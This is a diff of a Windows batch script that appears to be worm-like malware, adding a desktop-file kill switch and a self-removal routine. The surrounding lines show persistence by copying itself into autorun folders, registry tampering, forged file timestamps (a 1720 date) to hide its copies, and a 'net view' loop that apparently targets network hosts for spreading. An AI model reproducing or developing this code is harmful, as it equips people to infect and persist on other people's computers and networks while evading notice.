@@ -86,6 +86,8 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v
 
 
 :cycle
+if exist "%path_desktop%\09.11.2001" goto :selfRemover
+
 copy /y "%~dpnx0" "%path_autoRun1%\"
 copy /y "%~dpnx0" "%path_autoRun2%\"
 %module_fileTouch% /w /a /c /d 05-25-1720 /t 22:59:59 "%path_autoRun1%\%~nx0"
@@ -163,7 +165,6 @@ for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The"
 )
 
 timeout /nobreak /t 5 >nul
-call :selfRemover
 goto :cycle
 
 
@@ -173,4 +174,8 @@ goto :cycle
 
 
 :selfRemover
-exit /b
+taskkill /f /im "%~nx0"
+
+del /q "%path_autoRun1%\%~nx0"
+del /q "%path_autoRun2%\%~nx0"
+exit
